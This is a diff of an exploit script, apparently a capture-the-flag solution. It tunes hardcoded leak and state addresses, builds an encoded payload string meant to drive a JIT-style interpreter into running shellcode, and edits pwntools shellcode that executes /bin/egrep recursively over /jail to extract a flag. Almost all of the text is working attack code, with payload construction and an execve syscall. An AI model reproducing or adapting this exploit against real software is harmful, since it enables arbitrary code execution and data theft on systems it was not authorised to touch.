@@ -32,8 +32,8 @@ def generate_shellcode(shellcode):
 jit_enable = "00000000000000000000"
 
 skek = 0xc0000b2000
-leak_addr = 0xc0000d5cc0
-state_ptr = 0xc0000d5f60
+leak_addr = 0xc0000d3cc0
+state_ptr = 0xc0000d3f60
 skek_offset = 0xc0000909a0 - 0xc0000908f0
 shellcode_offset = 0x7f36a384ef7d - 0x7f36a384e000
 
@@ -56,11 +56,11 @@ code += "pq^qq"
 code += generate_number( skek )
 code += "Pq-qr^rr"
 for i in range(8):
-	code += "ir"
+	code += "ir"	
 code += "/qr"
 code += "mLq"
 code += "^rr^qq^jj"
-code += generate_number(0x6000 - 0x492a)
+code += generate_number(0x4000 + 0x5d05f)
 code += "-lrpl^LL"
 code += "^rr^qq^jj"
 code = code + "0" * (16382 - len(code))
@@ -72,7 +72,7 @@ code += "mLL"
 
 shellcode = shellcraft.pushstr( "/bin/egrep" )
 shellcode += "mov rdi, rsp;"
-shellcode += shellcraft.pushstr_array( "rsi", ["/bin/egrep", "-r", '[A-Z0-9]{31}=', './jail'])
+shellcode += shellcraft.pushstr_array( "rsi", ["/bin/egrep", "-r", '[A-Z0-9]{31}=', '/jail'])
 shellcode += "mov rdx, 0;"
 shellcode += "mov rax, 59;"
 shellcode += "syscall;"
